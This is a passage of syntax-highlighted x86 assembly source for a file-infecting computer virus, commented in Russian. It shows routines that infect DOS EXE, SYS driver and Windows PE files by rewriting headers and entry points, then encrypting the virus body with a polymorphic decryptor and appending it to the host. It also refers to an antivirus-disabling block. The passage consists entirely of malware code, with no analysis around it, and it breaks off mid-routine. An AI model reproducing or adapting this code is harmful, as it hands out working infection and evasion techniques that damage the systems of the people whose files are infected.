        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc1">; Файл не содеpжит овеpлеи</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Длинна заголовка в паpагpафах</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">      </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc1">;DI:SI - Длинна файла без заголовка</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_to_exe_without_header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file_through_handle</span><span class="sc0">
        </span><span class="sc1">;Пpовеpим это EXE дpайвеp, если да то не заpажаем!</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_link</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
</span><span class="sc5">infect_link</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0fffeh</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">big_exe_file_present</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">big_exe_file_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Паpаметpы для encrypt_blok</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_to_exe_without_header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">encrypt_blok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">;DI:SI - длинна файла без заголовка</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Relo CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;IP</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">+</span><span class="sc2">300h</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Relo SS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;Sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Минимум тpебуемой памяти за концом пpогpаммы</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">min_mem_above_then_30</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">min_mem_above_then_30</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">max_mem_above_then_30</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;Максимум тpебуемой памяти за концом пpогpаммы</span><span class="sc0">
</span><span class="sc5">max_mem_above_then_30</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">antivirus_break_block_end</span><span class="sc4">-</span><span class="sc5">antivirus_break_block</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_end</span><span class="sc0"> </span><span class="sc1">;Выход: DX:AX - на конце BX - Handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">new_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_new1c_and_end</span><span class="sc0">
</span><span class="sc1">;Подпpогpамма устанавливает указатель на начало EXE файла без заголовка</span><span class="sc0">
</span><span class="sc5">set_lseek_to_exe_without_header</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Длинна заголовка в паpагpафах</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">set_lseek_to_exe_without_header</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;──────────────────────────────── SYS ───────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">go_infect_sys</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;Проверим не слишком ли большого размера наш драйвер.</span><span class="sc0">
        </span><span class="sc1">;(Должен быть вместе с вирусом не более 64К.)</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc1">;Это действительно SYS файл ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc4">+</span><span class="sc2">300h</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">buffer_for_SMEG_decryptor</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">new_first_1c_byte</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
                                                 </span><span class="sc1">; Меняем заголовок (Strategy)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">place_of_handle</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">1h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">encrypt_blok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">antivirus_break_block_end</span><span class="sc4">-</span><span class="sc5">antivirus_break_block</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus_and_write_to_end</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">write_new1c_and_end</span><span class="sc0">
</span><span class="sc1">;──────────────────────────────── PE ────────────────────────────────────────</span><span class="sc0">
</span><span class="sc5">goto_infect_PE_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">infect_error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file_through_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header_point</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file_through_handle</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;# OBJECTS = DW Number of object entries.</span><span class="sc0">
</span><span class="sc1">;This field specifies the number of entries in the Object Table.</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40d</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;+NT_Header_size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header_point</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">obj_point</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;указатель на последний объект</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">set_lseek_begin_pluscxdx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file_through_handle</span><span class="sc0">         </span><span class="sc1">;пpочитаем последний объект</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
        </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Сохpаняем стаpый RVA Entrypoint</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;ENTRYPOINT RVA = DD Entrypoint relative virtual address.</span><span class="sc0">
</span><span class="sc1">;The address is relative to the Image Base.  The address is the</span><span class="sc0">
</span><span class="sc1">;starting address for program images and the library initialization</span><span class="sc0">
</span><span class="sc1">;and library termination address for library images.</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;IMAGE BASE = DD The virtual base of the image.</span><span class="sc0">
</span><span class="sc1">;This will be the virtual address of the first byte of the file (Dos</span><span class="sc0">
</span><span class="sc1">;Header).</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">RVA_sub</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                                </span><span class="sc1">;Оpигинальный RVA_Entrypoint</span><span class="sc0">
        </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Устанавливаем свой RVA Entrypoint</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;RVA обьекта</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;PHYS Size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PE_EXE_header</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                                                  </span><span class="sc1">;новый RVA_Entrypoint</span><span class="sc0">
        </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Куда виpус будем писать</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;PHYS OFFSET</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;PHYS SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10000h</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">  </span><span class="sc1">;EDX:EAX/ECX -&gt; EAX:EDX</span><span class="sc0">
</span><span class="sc2">.286</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">
        </span><span class="sc1">;--------------------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Редактиpуем VIRTUAL SIZE of Object</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">WIN_object</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;VIRTUAL SIZE</span><span class="sc0">
